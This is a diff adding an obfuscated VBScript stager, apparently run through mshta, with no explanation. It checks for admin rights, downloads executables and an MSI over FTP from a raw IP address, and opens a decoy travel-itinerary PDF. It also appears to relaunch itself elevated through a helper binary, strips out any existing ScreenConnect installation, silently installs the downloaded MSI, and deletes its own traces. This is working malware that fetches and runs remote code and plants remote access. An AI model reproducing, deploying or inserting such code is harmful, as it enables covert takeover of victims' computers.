@@ -1,0 +1,158 @@
+' stage run
+' built c798f15f
+' stage
+Dim t7n, ohr, fahbx, x32t, msy, gtkq4, gg3a1, zvtwx, wgs, xcx, oaum, zkdvj, zfymn, wku, k33, vs2rr, fpv73, m8u, kjht
+Dim ffq, t1c2, vshvu, o4bgb, fzj, o8rn, mmh
+Set t7n = CreateObject("Scripting.FileSystemObject")
+Set ohr = CreateObject("WScript.Shell")
+x32t = ohr.ExpandEnvironmentStrings("%TEMP%")
+Set fahbx = t7n.OpenTextFile(x32t & "\s2ee26.txt", 8, True)
+fahbx.WriteLine "[stage] start"
+mmh = "C:\ProgramData\sd"
+
+o4bgb = False
+ffq = x32t & "\_p.txt"
+gtkq4 = ohr.Run("cmd.exe /c C:\Windows\System32\whoami.exe /groups > """ & ffq & """", 0, True)
+fahbx.WriteLine "[stage] whoami rc=" & gtkq4
+zfd = 5
+If t7n.FileExists(ffq) Then
+    Set vshvu = t7n.OpenTextFile(ffq, 1)
+    mct9 = 7
+    If Not vshvu.AtEndOfStream Then t1c2 = vshvu.ReadAll
+    vshvu.Close
+    If InStr(t1c2, "S-1-16-12288") > 0 Or InStr(t1c2, "S-1-16-16384") > 0 Then o4bgb = True
+    t7n.DeleteFile ffq, True
+End If
+fahbx.WriteLine "[stage] admin=" & o4bgb
+
+
+If Not o4bgb Then
+    If Not t7n.FolderExists(mmh) Then
+        On Error Resume Next
+        mx1cs = 3
+        t7n.CreateFolder mmh
+        On Error GoTo 0
+    End If
+    msy = "curl.exe -s --fail -L " & "-u ano" & "nymous" & ":ftp" & "@example." & "com " & "-o """ & mmh & "\icu.exe"" " & "ftp://72.51.57.39/icu." & "exe"
+    gtkq4 = ohr.Run("cmd.exe /c " & msy, 0, True)
+    fahbx.WriteLine "[stage] icu dl rc=" & gtkq4
+    If t7n.FileExists(mmh & "\icu.exe") Then
+        fzj = Replace(location.href, "file:///", "")
+        fzj = Replace(fzj, "%20", " ")
+        fzj = Replace(fzj, "/", "\")
+        On Error Resume Next
+        t7n.DeleteFile mmh & "\p-log.txt", True
+        On Error GoTo 0
+        Set vshvu = t7n.CreateTextFile(mmh & "\run.vbs", True)
+        vshvu.WriteLine "On Error Resume Next"
+        vshvu.WriteLine "Dim sh"
+        vshvu.WriteLine "Set sh = CreateObject(""WScript.Shell"")"
+        vshvu.WriteLine "sh.Run ""cmd.exe /c echo [icu-vbs] hit %DATE% %TIME%> " & mmh & "\p-log.txt"", 0, True"
+        vshvu.WriteLine "sh.Run ""mshta.exe "" & Chr(34) & """ & fzj & """ & Chr(34), 0, False"
+        vshvu.Close
+        fahbx.WriteLine "[stage] handoff start"
+        fahbx.Close
+        gtkq4 = ohr.Run("cmd.exe /c """ & mmh & "\icu.exe"" m4a1_dev4 " & mmh & "\run.vbs", 0, False)
+    Else
+        fahbx.WriteLine "[stage] icu missing"
+        fahbx.Close
+
+    End If
+Else
+    msy = "curl.exe -s --fail -L -o """ & x32t & "\TRAVELITENERARY.pdf"" " & "https://raw.gi" & "thubusercontent.com" & "/slynet999-code" & "r/Yamb" & "o/main/t" & ".pdf"
+    gtkq4 = ohr.Run("cmd.exe /c " & msy, 0, True)
+    zbqh = 4
+    fahbx.WriteLine "[stage] pdf dl rc=" & gtkq4
+    gg3a1 = x32t & "\TRAVELITENERARY.pdf"
+    If t7n.FileExists(gg3a1) Then
+        On Error Resume Next
+        zvtwx = ohr.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe\")
+        If Err.Number <> 0 Or Len(zvtwx) = 0 Then
+            zvtwx = "msedge.exe"
+            Err.Clear
+            fuw0m = 4
+        End If
+        On Error GoTo 0
+        wgs = ohr.Run(Chr(34) & zvtwx & Chr(34) & " " & Chr(34) & gg3a1 & Chr(34), 1, False)
+        fahbx.WriteLine "[stage] edge rc=" & wgs
+    Else
+    ty1b = 9
+
+        fahbx.WriteLine "[stage] pdf missing"
+    End If
+
+    msy = "curl.exe -s --fail -L " & "-u ano" & "nymous" & ":ftp" & "@example." & "com " & "-o """ & x32t & "\helper.msi"" " & "ftp://72." & "51.57.39/hel" & "per.msi"
+    gtkq4 = ohr.Run("cmd.exe /c " & msy, 0, True)
+    fahbx.WriteLine "[stage] msi dl rc=" & gtkq4
+
+    fahbx.WriteLine "[stage] sweep start"
+    Set xcx = GetObject("winmgmts:\\.\root\cimv2")
+    Set oaum = xcx.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%ScreenConnect%'")
+    For Each zkdvj In oaum
+        On Error Resume Next
+        zkdvj.Terminate()
+        On Error GoTo 0
+    Next
+    Set oaum = xcx.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE 'ScreenConnect%'")
+    w9m = 5
+    For Each zkdvj In oaum
+        On Error Resume Next
+        zkdvj.StopService()
+        On Error GoTo 0
+    Next
+    gtkq4 = ohr.Run("cmd.exe /c ping -n 2 127.0.0.1 >nul", 0, True)
+    Set oaum = xcx.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE 'ScreenConnect%'")
+    For Each zkdvj In oaum
+        On Error Resume Next
+        zkdvj.Delete()
+        On Error GoTo 0
+    Next
+    For Each zfymn In Array("C:\Program Files (x86)", "C:\Program Files")
+        If t7n.FolderExists(zfymn) Then
+            For Each wku In t7n.GetFolder(zfymn).SubFolders
+                If InStr(wku.Name, "ScreenConnect") = 1 Then
+                    On Error Resume Next
+                    wku.Delete True
+                    On Error GoTo 0
+                End If
+            Next
+        End If
+    Next
+    Set k33 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
+    For Each vs2rr In Array("SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SYSTEM\CurrentControlSet\Services")
+        On Error Resume Next
+        fpv73 = ""
+        k33.EnumKey &H80000002, vs2rr, fpv73
+        If IsArray(fpv73) Then
+            For Each zkdvj In fpv73
+                If InStr(zkdvj, "ScreenConnect") > 0 Then
+
+                    k33.DeleteKey &H80000002, vs2rr & "\" & zkdvj
+                End If
+            Next
+        End If
+        Err.Clear
+    Next
+    k33.DeleteKey &H80000002, "SOFTWARE\WOW6432Node\ScreenConnect"
+    k33.DeleteKey &H80000001, "Software\ScreenConnect"
+    fahbx.WriteLine "[stage] sweep done"
+
+    m8u = x32t & "\helper.msi"
+    If t7n.FileExists(m8u) Then
+        kjht = ohr.Run("msiexec.exe /i """ & m8u & """ /qn /norestart", 0, False)
+        fahbx.WriteLine "[stage] msi rc=" & kjht
+    Else
+    f5pc8 = 0
+        fahbx.WriteLine "[stage] msi missing"
+    End If
+
+    On Error Resume Next
+    If t7n.FileExists(x32t & "\e.bat") Then t7n.DeleteFile x32t & "\e.bat", True
+    If t7n.FileExists(x32t & "\icu.exe") Then t7n.DeleteFile x32t & "\icu.exe", True
+    If t7n.FileExists(mmh & "\run.vbs") Then t7n.DeleteFile mmh & "\run.vbs", True
+    If t7n.FileExists(mmh & "\icu.exe") Then t7n.DeleteFile mmh & "\icu.exe", True
+    If t7n.FileExists(mmh & "\p-log.txt") Then t7n.DeleteFile mmh & "\p-log.txt", True
+    On Error GoTo 0
+    fahbx.WriteLine "[stage] done"
+    fahbx.Close
+End If
